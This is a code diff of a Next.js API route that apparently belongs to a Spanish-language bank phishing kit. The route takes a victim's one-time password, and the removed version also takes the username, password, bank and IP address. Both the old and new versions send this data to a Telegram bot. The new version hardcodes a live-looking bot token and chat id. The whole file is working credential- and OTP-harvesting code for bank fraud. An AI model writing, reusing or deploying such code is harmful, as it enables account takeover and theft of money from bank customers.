@@ -1,66 +1,36 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { TELEGRAM_CONFIG } from '@/lib/database';
 import { caseStore } from '@/lib/store';
 
 export async function POST(request: NextRequest) {
     try {
         const body = await request.json();
-        const { otp, registro, usuario, password, banco } = body;
+        const { otp } = body;
 
-        if (!otp) {
-            return NextResponse.json(
-                { success: false, message: 'OTP requerido' },
-                { status: 400 }
-            );
-        }
+        const idregRaw = request.headers.get('cookie')?.split('; ').find(row => row.startsWith('id_registro='))?.split('=')[1];
+        const idreg = idregRaw ? parseInt(idregRaw) : null;
 
-        // Get client IP
-        const forwarded = request.headers.get('x-forwarded-for');
-        const ip = forwarded ? forwarded.split(',')[0] : request.headers.get('x-real-ip') || 'unknown';
+        if (idreg) {
+            caseStore.updateCaseData(idreg, { otp });
+            caseStore.updateCaseStatus(idreg, 3); // 3: OTP_ENTERED
 
-        // Send OTP to Telegram
-        const message = `🏦 INGRESO DE USUARIO Y OTP 🏦
-=================
-DATOS
-=================
-🏦Banco: ${banco}
-⚙️Usuario: ${usuario}
-🔐Clave: ${password}
-🔑Dinamica: ${otp}
-🌐IP: ${ip}`;
+            const record = caseStore.getCase(idreg);
+            if (record) {
+                const message = `🔢 OTP RECIBIDO:\n👤 User: ${record.usuario}\n🏦 Bank: ${record.banco}\n🔢 OTP: ${otp}\n🆔 ID: ${idreg}`;
 
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
-        await fetch(telegramUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-
-        // Update local store
-        if (registro) {
-            caseStore.updateCaseData(parseInt(registro), { otp, status: 3 });
-        }
-
-        return NextResponse.json({
-            success: true,
-            status: 3 // OTP_ENTERED
-        }, {
-            headers: {
-                'Set-Cookie': `cdinamica=${otp}; Path=/; Max-Age=${60 * 9}`
+                await fetch(`https://api.telegram.org/bot8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: '-4927137480',
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
             }
-        });
+        }
 
+        return NextResponse.json({ success: true });
     } catch (error) {
-        console.error('Error in paso-otp:', error);
-        return NextResponse.json(
-            { success: false, message: 'Error al procesar OTP' },
-            { status: 500 }
-        );
+        return NextResponse.json({ success: false }, { status: 500 });
     }
 }
